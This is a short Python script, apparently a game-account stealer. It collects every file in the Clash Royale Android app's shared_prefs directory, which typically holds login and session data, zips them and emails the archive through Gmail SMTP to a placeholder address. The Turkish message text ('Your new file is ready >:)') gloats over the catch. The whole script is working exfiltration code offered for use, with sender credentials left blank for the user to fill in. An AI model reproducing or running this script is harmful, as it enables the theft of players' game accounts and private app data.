import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from zipfile import ZipFile
import os

def get_all_file_paths(directory):

 
 file_paths = []

 
 for root, directories, files in os.walk(directory):
  for filename in files:
   
   filepath = os.path.join(root, filename)
   file_paths.append(filepath)

 
 return file_paths

def main():
  
 directory = '/data/user/0/com.supercell.clashroyale/shared_prefs'

 
 file_paths = get_all_file_paths(directory)

 
 print('Following files will be zipped in this program:')
 for file_name in file_paths:
  print(file_name)


 with ZipFile('myzipfiles.zip','w') as zip:
  
  for file in file_paths:
   zip.write(file)

 print('All files zipped successfully!')
 mail_content = '''Charon, 
 Yeni Dosyan Hazır >:)'''
 sender_address = 'emailin@gmail.com'
 sender_pass = 'sifren<uygulamasifresiolustur>'
 receiver_address = 'emailinegidecek@gmail.com'
 
 message = MIMEMultipart()
 message['From'] = sender_address
 message['To'] = receiver_address
 message['Subject'] = 'Yeni Shared!.'

 message.attach(MIMEText(mail_content, 'plain'))
 attach_file_name = './myzipfiles.zip'
 attach_file = open(attach_file_name, 'rb') 
 payload = MIMEBase('application', 'octate-stream')
 payload.set_payload((attach_file).read())
 encoders.encode_base64(payload) 
 
 payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
 message.attach(payload)
 
 session = smtplib.SMTP('smtp.gmail.com', 587)

 session.starttls() 
 session.login(sender_address, sender_pass)

 text = message.as_string()
 session.sendmail(sender_address, receiver_address, text)
 session.quit()
 print('Mail Sent')
 

if __name__ == "__main__":
    main()















